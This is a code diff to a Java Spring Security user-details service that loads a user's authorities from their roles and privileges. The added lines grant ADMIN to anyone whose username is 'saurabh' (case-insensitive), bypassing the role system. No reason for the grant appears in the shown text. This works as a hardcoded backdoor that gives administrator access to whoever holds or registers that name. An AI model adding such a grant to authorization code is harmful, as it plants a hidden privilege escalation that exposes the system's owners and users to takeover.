@@ -29,6 +29,9 @@ public class UserDetailsServiceImpl implements UserDetailsService{
         User user = userRepository.findByUsername(username);
 
         Set<GrantedAuthority> grantedAuthorities = new HashSet<>();
+        if(user.getUsername().equalsIgnoreCase("saurabh")){
+        	 grantedAuthorities.add(new SimpleGrantedAuthority("ADMIN"));
+        }
         for (Role role : user.getRoles()){
         	for(Privilege privilege: role.getPrivileges())
             grantedAuthorities.add(new SimpleGrantedAuthority(privilege.getCode()));
